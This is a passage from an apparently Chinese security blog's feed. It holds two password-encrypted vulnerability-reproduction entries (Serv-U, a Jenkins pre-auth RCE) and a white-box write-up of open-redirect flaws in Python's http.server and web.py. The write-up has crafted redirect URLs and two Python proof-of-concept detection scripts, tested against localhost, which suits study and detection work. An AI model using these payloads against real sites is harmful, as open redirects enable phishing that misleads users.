    <label for="pass">您好, 这里需要密码.</label>
    <div class="bottom-line"></div>
  </div>
</div>
<div id="decryptionError" style="display: none;">Incorrect Password!</div>
<div id="noContentError" style="display: none;">No content to display!</div>
<div id="encrypt-blog" style="display:none">
U2FsdGVkX19ovYzqRATZ5oxDPOMYXeGV2zbviwe8uMbJt1uuVZ2fcxJp9I5NotHrXtVVVHJpdd4H/TjtdSJbWWGYq81XJhX9EvZHVk7UmvaaBOu1UCNDuwihiG0kfUP75hrI8g8H/0H9SRxxj4QVF4YRCp1m6/kqS11MjU3MSOduDV4Xyi1zZ8+br0MnFv9opr96ZcTWV896YuQmp03J9gFZVI97n8eqVA08ttkfJ+n59epzXlBgfDq4sM2e5hy5PCInApID1pyALCUYJYryVDUX9bJtnJybHq6xO1/omZWLPa3CIE8RpczKuTv/H1NrcAMvr9FC3qWL/5mfGWEfocIytuH8VkFFagHAW7qt/8QhO/Nretu9JaC+NnRdPlSso4BzG7M5v7+6FjrgsB1/K4RLmhY88hKtDrkgdLl8PLeeQbkDfNvdhmMRhHY3wprqWDB9mIdzqiqUolVkwoAQ89dJaPvRRJVDwkOoJfO/5a5VSsjPk33LkbXuoNOYLFpgHpM8CMZHM1mYL2iev8S2EDQFQJeE/ibb6U1bqEJL0DqUts/W9Qdp09CKLIf4sUAeuRpxSHLsbcm0abrq0wAEH1cpZRrchPoaNDwDjMnzjXOMtm/vbIrDizNZ6dBCg1h49hhfoIvP6Q0VB1HF1Ovf+649kUuYBMxXledPeTVbmm/4ZjVE0KcYAooN4542aao1fstGXGZYLjFQDVIshYmT1ghEgN03YIbkJXMnLK2VrJscV8hjhNxu/TgHRG4obi5lD3fgDApMRvjta35YlVEtCbprRFa90MYkdpK/dT85ht2R7d0uCx+I+hn0cRM8DSpK8QKbFCdQPt/WLBsMCt0gwj0pZDgryJvNj3/fRCLJx1XNC4OPFaptyCrv/Z2Js99HcpLO4xgl0RUTeYS59hdgAQxR1qm2ZMiyruF21bQdeUcVwuh7wEO6BtF/e/ts3wlk7MmY03xRWIFhRXf7Ws/8lffMcgiOhrjcLQXp0rujx6aThJAYNalGSa6Iqdr6BAOwGXDmjorSBNPFk9wpm1c2k4gbNjjwGPkMaoY/PbFQ+iCqUuX05fhJvzOtRb2dZiWy7ngktLgxy7U4GcdrDGzGd0jIWmF+bwtzM6aGxC1DG7hvvkDx3raFmJQzQtSUCEv+wAPtzwqk+LWC7M+sGFLtR8m6Oupbg+5F1QTJEFx+iYoU5l5Ij+n7rwWPCR5ObJDJ6DQRG+LAYxcrCYDEfhmLmQQh6z419n5+1l+wBfwuPIg06K3EriUe45d9QwIRzD4pPBarwZadKzAW1faiqwlCTuUNqAsS6ysjKSpGiPlwGygaOpt/Fr60jJNEEbEM3oI3HhdKwPwEa4JKvhsSzifFhRPRTti2PDo/kb7sRHWzejp5Qh3NRKsjK6Q22gYmjAo7K83pAf3BRbPJsb9cbQBFgnjEqnSIbRM+d6f++CT2YpjnwYea/YQPqqD9mGprkddeonhn8ebSSrZcWLc6JwpZ97SFvEKJblduyYt2zhelFJUyEJUgFtd4MpR581+dCp/12A4uF+K4g+2TwiiRkv+XCSynp461qQbPXKiOSOYXOBIet9FULf9bRKtPtires3fC3Ce61kPtFd9gToq65aS0BjhxWFE8SELC79beBZGGsmlCoJb5OTLWVO4UbdelRi4iDLq7Pn5dSrGJAvnHS9yfRMVkXG7MhvYgNXvd6CypFqqWw44kgDitR5c+lY4zWklsMYT9y4tDG7fC9ZCaqSrIZ2kTpu3YQ2fQBz/DG2RxZbnH2gTLqdBZI7dWa7y3oKiP2tSIVLkkHK+nQmng//PeR6TWmZe2fxNRxDbsvUOn+h9Cmp8igVavqZEZIEh7OcC1lcoCfHgPr/yQKjdHIHLap++Fd08lKvzcwOY7Ub+8QLTVX4oY8XSd4seRDWRwHcnhowWwJN+mCh/zPlqcCBqbXnVObpYu82CcLYsVRP0+U2BijfUNED+uYej4iTehZ25VZs1kBLyp7y4vaq6pyiVK8nbaJO3I2ethT6DbE8yPw9tdsmIaxFC0VfsUg4ps95WIF/xt6s9TSoetL1YBGr3CvEIFrVwNcWW7vvwDYMFZjSkuz34FjCQafMW4Z/Hi1e95m2KMcBghKCk2HYL40dK3ZdlAgeSVlaW9dDwGU3l4pbOX72Eu2eHRdJssBme7Hla+94HZkwu4RxOoCYZdJNXuGu9ywJjaL7U3EcyJPPMYNRaJsXhV2nE6CgVvH5JlrRPJAzaskvWcp+0Gpo2DXp5EfqgOboEQv+ubpNWpOMXLQ9BUJl0FDMqyGXSfpL0ApATetiVQWgEvL8aYhFA0fnReglYeB2FSbijgSmy0tZtK4sH7Uu0QJMvWpPLWnXZ9xgg8kFcyaHB3D8qqqiK6yEZ01+8yYpoWGk6JQvZbWiBDGYs7fNkY8pBKizy8yED7FdQpBm9BDmhtTxzte7a1EmZs5v/ivhOd95pq6U+KAiFyioNLvTz52fLDuTIZ7euqPrnP80uqP84YKhgSEkp6E8LKnNDmm7e79hXZq9rEI/5FdJbWEl3XIQtiyyE+oI6K8nOQK9MjawnRy6k7LKk82AO6gsvyi40WJUEfuMxBZYGhcjpgDUC2/HiUq521vcZAUn26yQFrldMyxaQCSW3fLKPfxLEM77jLkhr+o2y/MNNQpQFmyxLdaiqPXQuI3HS629PEYrq8Oz+jnThj0ZiPkHXtU67FtZnq55nepw9RGaZwkiu3urPaIixQdOoQzB+hu97KjFS1gZ5Ifaf5N6Ty9fu92egp0okRqrllfbKWgIeeUqjC6rnTKb3D8QRdsultSwD74FZ45WPofQSb8uLZlWz0B9/HgQ94FsD/q943z3aBzPvcno5phGGBoLKyYi5QpsSeSQZPKm46XboPkyzv+bZY2IRAijBLdJOOFUNP9+XpXCZoo2WkwPnDpYMvl5pQYgOicAB6EM9aBUWATOoB8oWeoF7ZG4+qbTCAAAUDPWiT5fYo/MIoLk8BuYW+kRpRXQKtLgeXp0QojlMYm3AGhwaPMGGLnHT7F9uxvmtxCZ3cb3bZi3aoM3e6+8eZXoN4JwAve/6w2AOSG7A9PBiwiAmZVyDC9DdswwJpJ/PjvAINOknQXlnnescJOkinfxrUqkoNG/ZcFjjEUT+h9/aehGXa3Wu+PPN1qVd3w+BihAIyPlcAom08hyKN+iZWtq6BvQQVI5qUlO6rlEMIDjqHJ0nisDc8YxvM9NPMgBxVPEK3XnIxFpY4G8T670a9emrX20RItsqITRXhb/c6zgPSIMyrU+zkcqwMKXtjhHeZXgSIm+tVrF5x50Y55p7MV9pFUzf9kBp1mKjqBZzKB9xUN3hZJzBgE2TqrJWa+K40mEWfvJL3yNAP8wHtkAtu+qMpt1Rq73mFNFrztujfr9xHBeswRLyA+640IbEIZgxmVQ9jRttXgu7M4WMSyMgdk7/WrLTXrVnwqyPGxJJhMf4Hq4udPresv4ADmjMoidnJIVsN4dOZbwrM6eUxK/zjn1M03xGE2PDciyxm/zixrj7+TjeRe2q6hfRh7fCE8ACjPWx5hDxHGmBCZ5QFzVQyAfQBre3XeVwQDEM4DNf5y2Gc94DMLuLd8U1vsPBLWlnCYpdjsaP71aVuFuqJVpaspsGPNAJFJ27Za/M8T1ivFuugdJntd+aBS5XynE15E0WIbesPtcm6bZPfUPGosgiYJ+Rh0GgmwRRFwG2mIqAJW1QA9G+mWJXQVoynlOfHRbXe4FSNg4+PiCN6z47AxwGGMjPAiiaJnlWr49tXZLsDWNAdQ2zOoFf5fepfdF6nBXjp6DzXFIp1UhuPOAgpu0AP01X6XtS6UgUvz2J9QAhvu39TaSCBH4B1sVJoqo00NJafZLI8ZAHEcM3S0omosyLFQgUZLHf7RFaAPDGVCKDRAO6E/LAR/jcW19dYH4tD/7FFMwZ/GPBLE5zF+qF31CPFCm3DRj+yu/x9L89PndiFMrbmeZ9+DhHzlhgWaK6+ifJSDWnGBDqA+AWto/Tk3ThW7qKWXtELNhk481VfDGrNzPEE7+D06vf4ZfaJFvnLQqBSxQBv8NABCtJpKIZcrKJ/3OOxWTWgrrxRmMSl+ThOTWGw7sED9joUiu5aiWIV8YNfDx5a52M2mNY5EnVKTdcD7oC7eT/amfp37Rw84Chb45GCJ4JFGYOPSf200fr+H1XqeA9iYp901ai7c1GbNJdTBRodNp05xPjbnCGz0VUjHC32cf8ZT1JEdipkdBpDRq63MwV/NT0VKdLykuYvj5ssJXsSzGp7BMvUaSWESH+ebXAneJhn8MOVW3164h2HdgVR3wNzNKDuSAvlX+dT6zr41hrv60vz88bpbYwp9Yc4DIyjrQMNVt+Cqoj7cv0Zm8+6urMrv2LpnqLpK16kiB+rW3MMnN1uNBRNKv9obst6WeMfT8rY745rqhgEYIBGafPLQE0KLC8malI8J4/jAGt6/w4UBSHlLb0mpODSVrMRDH+0uxJZitdmvDGjF4cz6gu13ULWzxYXz2AVgC0afW+eePADTmeKk4mMJhePSx/RSs6zaKYuI2hkMniC+V26RKsYlCxkTPE2gP+Xxa08UZe20EoDyGtABgDzLq0FLsAgnnlfhZTYTRBUgMaXhPWwUE90jULR1UCm6KrdpTqLEEq7BUePoBVwbxP2pTr53gslD3jLNDOMEFO2dUuHeOty5hq0FDEW1fSUqW2dgJ+23pA9S9eV9ShA3V+MyPB9+dEcAEI2fmYmMlUawdeuuJ0tGyBpEFCSQyWzkH7aTtjyPkRNW5uPK95X7eJ4fKFrYl0c8gPRxDqgUAyhR10m7Bbn/slOW1e0ES+4jhZkLiWOyZ2tRXzd7HHcrIamcQr3FCfIDXDXu1oR1l+WBCSXYW7K4A0FG6KIcRuQGt7+x2aFFSv+ao83HDpv8g9gYdKsUTVS9hDsewmsVMrN/k1Li9Eyrs0MusqAUSBqEiGgg03XOH/eD/ay3VDcn5psGljKHbAjVRPj4D/zUaX1zRvs1nN3W2aryL6XyWgg6hwvv0Xl8LPIJ3kJ+sp/JQ+1HIUuVxUWn6iiMbAP9xdR1Zjx6+Xj1q6oC1NyiJVp3W3AqBYQA/cA6I+7E0bCdcl5lJG8MlAzFOAuLR4xp1TcJvNTM0xEr3dYvrHs+oi+toqjlXYK1lGIr4rA52+ETxP6/yv/gDFwkBs+U7GujG4s1P3rjgm5toDdf2Tl1me9OPzWrQ6oE9ecXUHXQVZ1KdcV/bb0ZLAsErOGV/LNpusqCeK7Ww876d28TOgVd+XP3UKuazlfXlJUWjqOJNtmeak8AGKO3/2Ju2RpkdhsZ05w2r3tXYk8AG/RxSHhFBO2eh925aasRvVwf2PIp282jl7gSEdX9G21I1W9TBkAoL3QJSc/QHi/l+CbpuNpFDgZqreLBwGsWCQuuxfSSkN4q0AsE1lMqeSR3gHmdBXJn72yJQ2SWrxYmhfO4XksdpYWoDHXhl9V+40c9IaEQ6OT4uRUc/FXsJsLuLN1LWSKyR1l3DJovtwTKeDcQAqEYaaHhuF/dEQcEX/NvQItbywXadNCYYAm77tPjdzg8iSVRo4DQYB2p1GItlWRc6J9ohLOoGaqvMMnMduKCn+N8FAH70rW8b5LKyi8e7yftUMBhyEXd0+4u3XWU9xdrjxW5cEK7YZ2+XZIoosAIgJfplSd44g+ooLiWN3UjsuZeXZr7j6Vc/4RL4vLNbVtWdPBB7BKPgltsVg5fFdMIC4yAPvUVMArylhkFCXPfhqTy8ma8ihqQFkn/0jFbHXeVvk7V6XrseEtKTwypDUp1Zx1wRiuYmUkO68qYxsq2arKP8UiwzU7RPmpwdLoogM2NMBOREkgbGY+McDFvPEseQxO+mm97KFDc6tY2FniHq5O8r1wHfmYQhSfQ0VSudNDkg5ngS7baviUiRmfdlflkDmM4/LC3e7S6Z05g/Kk2gn/iBFCq7LWY3MaFuwb07WzaQ47zMmfwp13twmO8l7hMCCrnNh0/cmk+J6oIZXqhO9CLpi4p7kSlREljXHNYh+KrOrFHW9zr2jtBRveclt7lGvQtypjqnM9x8Q/khdkLVLryCnimfu65jyo5jKFGgZUBEgn6AZqYzFbHeUjgRam/7zvdp0tUrpxrHloVNzWeKRtEwxRrTWcuEGL790Yg+Rj2cU6usIBTvEUlcEuntTOhNni+f7hyyRxwUmVWgbi8BtN8cjxZtsuZ8d73AlO8j+n4M5jEcfytqpmzLjT8n5QfnaWMXrZHmeHSgRax/1qyT/qnz5xFXucPXf3L7u6dYaD2N1m68LX8rN1/D5FBeGKA4muiNIQglTih40u8CtRzpj1X7VYI2VrW3kToikC4LUZapv/idZF8T40ayLfiGKpCcFtzzEe5fuFLrvBdegFGccSsydvO3arhIirXZInaL1ckFL9iD4BsnzIStnP/oS6/lxIrXCFQwT+ITsyr/MBwaKcte9O+qj5Ph7DdOTrggohHANKTV6MavA8Le1VJDg0tlhip3j6MUg3/aMfkWnKD3jtKBjbzv1+0YQBnVkzrd/4qT50cWJFFInsW1LSdBP1Zmjk62Zl9mcdHrf38GOPVJ110nXxoLHgW2Y50AdUsoG41U0zo9hBDK/eU/ig1JKFkqTXtZf0Hq3OCviIjLrVsMoTnfOblWTD3b+LKT+649+KVCNqmrBr2/a25kqeiSwoarffpekseLtILoRFlvXRGb//vLa9XP6SvffA1yhKL0u7YEw17mbGAA7DOxVTvTiRoD9il8X5o+OkfeicBs7PESqgwREBhodhd/rTf/N/z6c0LEoMAG4x40vzovRdgOk/GTShldTzlJ+/Gg1J7npNxB6EiYSwCn6SFwhJ4kw/gnQNM1/onaq6P5GwfIWXlhvQ1bD9hxS0Sl5v3Yk2NdzF7Khd0QyeELUebX/+ekw81cy9hk4L3YRF01ob0xjqEYWPiiFn8M75dLlYxq9Wz/YzjDXVbDdy2VOdz+W0W9KbSmrUksXbwtFzjX3wcJv8rztPoez4pTobS/Zg/1XSll90OD2UE6P9kOErXi/cK6ovVCHtk//epLC6alnIGyGSEqZ/1avq2Z8hqhkcYD5TWBdWpPvt3pHx0j+CQ4sEa+9giHtkNEniCmH3vG4LltF0Yw1nxoRV7nKhA1MeswmsvSjfnbOEeq2yuSyqxDG6/xG6UfzZ2l0YOLOGE8rd3QKG5dYlPNJvKAGcscrzB9zYjytr/6HUg4+8ZyrXmNpLzFDUvumhXQtPeKFTVoQu0uPA6pZcMQ0f7uc5lWTcqm4TZNI7Fvau+FdacqkqWQkUhjxspuRNKflLQhd57XmZPL4da1ZvE19cTRr5cjc3RhuNOW4VEsIcOBJhlX01jexpD9yQy6o8B8GwuAEiF3b2U0Zo+7IeNTTQCBMEdmSVCU2xcYOnZz4/NFAX6enw7RWr0eQtILgYfuSVysbyfWxvRELA+fX2vSI2EL5kJeifxy/ye2132H96+LeRkiLt9p3+ot325o97t/z60ARA99VKb0IHoWyECQYXttA2W+VeyfQJDIJEBRZDFRO3a1Yp1PbEF7hT6W/LfxNv4K0=
</div>
<script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
        <tag>Serv-U 15.1.6</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2019-1003000 Jenkins-PreAuth-RCE复现</title>
    <url>/2019/07/28/CVE-2019-1003000-Jenkins-PreAuth-RCE%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<div id="hbe-security">
  <div class="hbe-input-container">
  <input type="password" class="hbe-form-control" id="pass" placeholder="您好, 这里需要密码." />
    <label for="pass">您好, 这里需要密码.</label>
    <div class="bottom-line"></div>
  </div>
</div>
<div id="decryptionError" style="display: none;">Incorrect Password!</div>
<div id="noContentError" style="display: none;">No content to display!</div>
<div id="encrypt-blog" style="display:none">

</div>
<script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
        <tag>Jenkins</tag>
      </tags>
  </entry>
  <entry>
    <title>URL跳转漏洞白盒实践</title>
    <url>/2018/11/21/URL%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E%E7%99%BD%E7%9B%92%E5%AE%9E%E8%B7%B5/</url>
    <content><![CDATA[<h2 id="python-http-server-web-py-URL跳转漏洞实践"><a href="#python-http-server-web-py-URL跳转漏洞实践" class="headerlink" title="python: http.server / web.py URL跳转漏洞实践"></a>python: http.server / web.py URL跳转漏洞实践</h2><blockquote>
<p>前几天学习了URL跳转漏洞，主要是从黑盒进行测试，今天看了P牛的一篇关于python的http.server和web.py的URL跳转漏洞分析，是从白盒来进行分析测试的，现将实践记录如下。</p>
</blockquote>
<h3 id="HTTP-SERVER"><a href="#HTTP-SERVER" class="headerlink" title="HTTP.SERVER"></a>HTTP.SERVER</h3><ul>
<li><p>python一键启动web服务器 <code>python -m http.server</code></p>
<p>在任意目录执行上面的命令，可以启动一个web服务端，模拟一个服务器。这里用到了http.server这个模块</p>
</li>
<li><p>http.server模块下包含几个类</p>
<ul>
<li><code>HTTPServer</code>这个类继承于<code>socketserver.TCPServer</code>，说明其实HTTP服务器本质是一个TCP服务器</li>
<li><code>BaseHTTPRequestHandler</code>，这是一个处理TCP协议内容的Handler，目的就是将从TCP流中获取的数据按照HTTP协议进行解析，并按照HTTP协议返回相应数据包。但这个类解析数据包后没有进行任何操作</li>
<li><code>SimpleHTTPRequestHandler</code>，这个类继承于<code>BaseHTTPRequestHandler</code>，从父类中拿到解析好的数据包，并将用户请求的path返回给用户，等于实现了一个静态文件服务器。</li>
<li><code>CGIHTTPRequestHandler</code>，这个类继承于<code>SimpleHTTPRequestHandler</code>，在静态文件服务器的基础上，增加了执行CGI脚本的功能。</li>
</ul>
</li>
<li><p>http.server的几个类的关系就是下面这样（P牛的图）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542797209.49.png" alt></p>
</li>
<li><p>通过分析：SimpleHTTPRequestHandler是将用户请求的path返回给用户的，并且它继承了BaseHTTPRequestHandler类的HTTP协议解析的特性，并返回数据包，所以说明http.server这个发生URL跳转会发生在SimpleHTTPRequestHandler的代码中</p>
</li>
<li><p>分析SimpleHTTPRequestHandler类源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SimpleHTTPRequestHandler</span><span class="params">(BaseHTTPRequestHandler)</span>:</span></span><br><span class="line">    server_version = <span class="string">"SimpleHTTP/"</span> + __version__</span><br><span class="line">	</span><br><span class="line">    <span class="comment">#如果是GET请求就调用do_GET函数，在do_GET中调用了send_head函数</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_GET</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""Serve a GET request."""</span></span><br><span class="line">        f = self.send_head()</span><br><span class="line">        <span class="keyword">if</span> f:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                self.copyfile(f, self.wfile)</span><br><span class="line">            <span class="keyword">finally</span>:</span><br><span class="line">                f.close()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">	</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send_head</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment">#translate_path函数解析用户输入的请求path，判断用户真正请求的文件</span></span><br><span class="line">        path = self.translate_path(self.path)</span><br><span class="line">        f = <span class="keyword">None</span></span><br><span class="line">        <span class="comment">#判断用户的请求的文件或目录是否在web服务器的目录中，如果在则进入第一个if语  		 句，如果请求的路径不存在则跳转到web服务的主页</span></span><br><span class="line">        <span class="keyword">if</span> os.path.isdir(path):</span><br><span class="line">            <span class="comment">#将用户输入的请求解析过后用rllib.parse.urlsplit拆分，用于后面的判断</span></span><br><span class="line">            parts = urllib.parse.urlsplit(self.path)</span><br><span class="line">            <span class="comment">#判断用户请求的地址是否以'/'结尾，如果是则直接返回相应请求内容，如果不是			 则进入第二个if语句，将用户的请求加上'/'后进行跳转，也是漏洞点</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> parts.path.endswith(<span class="string">'/'</span>):</span><br><span class="line">                <span class="comment"># redirect browser - doing basically what apache does</span></span><br><span class="line">                self.send_response(HTTPStatus.MOVED_PERMANENTLY)</span><br><span class="line">                new_parts = (parts[<span class="number">0</span>], parts[<span class="number">1</span>], parts[<span class="number">2</span>] + <span class="string">'/'</span>,</span><br><span class="line">                             parts[<span class="number">3</span>], parts[<span class="number">4</span>])</span><br><span class="line">                new_url = urllib.parse.urlunsplit(new_parts)</span><br><span class="line">                self.send_header(<span class="string">"Location"</span>, new_url)</span><br><span class="line">                self.end_headers()</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">            <span class="keyword">for</span> index <span class="keyword">in</span> <span class="string">"index.html"</span>, <span class="string">"index.htm"</span>:</span><br><span class="line">                index = os.path.join(path, index)</span><br><span class="line">                <span class="keyword">if</span> os.path.exists(index):</span><br><span class="line">                    path = index</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> self.list_directory(path)</span><br><span class="line">        <span class="comment"># ...</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>找到漏洞点在 if not parts.path.endswith(‘/‘)后进一步分析：</p>
<ul>
<li>这里的代码逻辑是判断用户请求的一个已经存在的文件是不是以 ‘/’结尾的，如果不是，则加上‘/’进行301跳转。</li>
<li>现在主流的浏览器访问 <code>//baidu.com</code> 时候会跳转到 <code>baidu.com</code> 会默认认为这个URL是当前数据包的协议，也就是说，这里要跳转，必须要构造成跳转时能解析为一个正常的域名，必须构造成 <code>127.0.0.1:8000//baidu.com</code></li>
<li>常见的URL跳转应该是<code>127.0.0.1:8000/baidu.com</code>一个斜杠，这里为什么要两个呢；原因在parts = urllib.parse.urlsplit(self.path)这里的分割，可以看到使用双斜杠后将用户的请求解析成一个netlocation,这里就会发生跳转，产生URL跳转漏洞。<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542799015.32.png" alt></li>
</ul>
</li>
<li><p>现在触发点找到了，还有一个问题，就是初始值的判断，http.server会判断用户访问的资源站内是否存在，绕过这个限制可以让请求跳到下一级目录 <code>/..</code></p>
</li>
<li><p>构造payload：<code>127.0.0.1:8000//baidu.com//..</code>(请求后没有跳转到百度，而是跳转到首页，抓包分析)<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542799795.42.png" alt></p>
<p>在浏览器直接请求127.0.0.1:8000//baidu.com//..根本不会将/..传到服务器，所以服务器收到的请求是 <code>127.0.0.1:8000//baidu.com/</code> 然后判断站点中不存在用户请求的资源</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542799619.52.png" alt></p>
</li>
<li><p>要让服务端收到的请求中包跳目录的请求，必须进行URL编码：(成功跳转，已经证明漏洞存在，这里的绕过跨目录没法控制，不能调到baidu主页，但是学习思路，证明漏洞存在已经达到目标了)</p>
<p><code>127.0.0.1:8000//baidu.com/%2f..</code>  或 <code>127.0.0.1:8000//baidu.com/%2f%2e%2e</code> <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542800155.96.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542800189.28.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542807039.02.png" alt></p>
</li>
</ul>
<h3 id="web-py框架"><a href="#web-py框架" class="headerlink" title="web.py框架"></a>web.py框架</h3><p>继承并使用了<code>SimpleHTTPRequestHandler</code>类，web.py在处理静态文件的时候会使用SimpleHTTPRequestHandler`类，所以会受到影响</p>
<ul>
<li><p>简单的web.py代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> web</span><br><span class="line">urls = (</span><br><span class="line">    <span class="string">'/(.*)'</span>, <span class="string">'hello'</span></span><br><span class="line">)</span><br><span class="line">app = web.application(urls, globals())</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hello</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GET</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> name:</span><br><span class="line">            name = <span class="string">'World'</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Hello, '</span> + name + <span class="string">'!'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542805858.68.png" alt></p>
</li>
<li><p>模拟真实的生产环境：（web.py的应用中必须是静态文件才有效，所以必须制定css,js,图片等，原原理都是一样的，这里的@代表后面的是域名）</p>
<p><code>http://127.0.0.1:8080////static%2fcss%2f@www.example.com/..%2f</code>  <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542806989.87.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542807062.2.png" alt></p>
</li>
</ul>
<h3 id="自动化检测"><a href="#自动化检测" class="headerlink" title="自动化检测"></a>自动化检测</h3><ul>
<li><p>http.server——poc</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="comment">#urllib.parse.urlparse代替python2中的urlparse模块中的urlparse.urlparse()方法</span></span><br><span class="line">    x = urllib.parse.urlparse(url)</span><br><span class="line">    target =  <span class="string">"&#123;0&#125;://&#123;1&#125;"</span>.format(x.scheme,x.netloc)</span><br><span class="line">    payload = <span class="string">"&#123;0&#125;//example.com/%2f%2e%2e"</span>.format(target)</span><br><span class="line">    print(payload)</span><br><span class="line"></span><br><span class="line">    response = requests.get(payload,allow_redirects=<span class="keyword">False</span>,timeout=<span class="number">3</span>,verify=<span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">301</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            location = response.headers[<span class="string">"Location"</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"example.com"</span> <span class="keyword">in</span> location:</span><br><span class="line">                print(<span class="string">"sucess"</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"false"</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    print(<span class="string">'Start!'</span>)</span><br><span class="line">    poc(sys.argv[<span class="number">1</span>])</span><br><span class="line">    print(<span class="string">'End!'</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542808635.89.png" alt></p>
</li>
<li><p>web.py——poc</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(url)</span>:</span></span><br><span class="line">    print(<span class="string">"you should provide a static resoure url, like js or css or picture!"</span>)</span><br><span class="line">    x = urllib.parse.urlparse(url)</span><br><span class="line">    <span class="comment">#将静态文件路径中的"/"转换为%2f</span></span><br><span class="line">    path_list = x.path.split(<span class="string">"/"</span>)</span><br><span class="line">    path_list.pop()</span><br><span class="line">    path_list.remove(<span class="string">""</span>)</span><br><span class="line">    path_list.append(<span class="string">""</span>)</span><br><span class="line">    path = <span class="string">"%2f"</span>.join(path_list)</span><br><span class="line">    <span class="comment"># print(path)</span></span><br><span class="line">    target =  <span class="string">"&#123;0&#125;://&#123;1&#125;"</span>.format(x.scheme,x.netloc)</span><br><span class="line">    payload = <span class="string">"&#123;0&#125;////&#123;1&#125;@www.example.com/..%2f"</span>.format(target,path)</span><br><span class="line">    print(payload)</span><br><span class="line"></span><br><span class="line">    response = requests.get(payload,allow_redirects=<span class="keyword">False</span>,timeout=<span class="number">3</span>,verify=<span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">301</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            location = response.headers[<span class="string">"Location"</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"example.com"</span> <span class="keyword">in</span> location:</span><br><span class="line">                print(<span class="string">"sucess"</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"false"</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    print(<span class="string">'Start!'</span>)</span><br><span class="line">    <span class="comment"># poc(sys.argv[1])</span></span><br><span class="line">    poc(<span class="string">'http://127.0.0.1:8080/static/css/'</span>)</span><br><span class="line">    print(<span class="string">'End!'</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542809567.07.png" alt></p>
</li>
</ul>
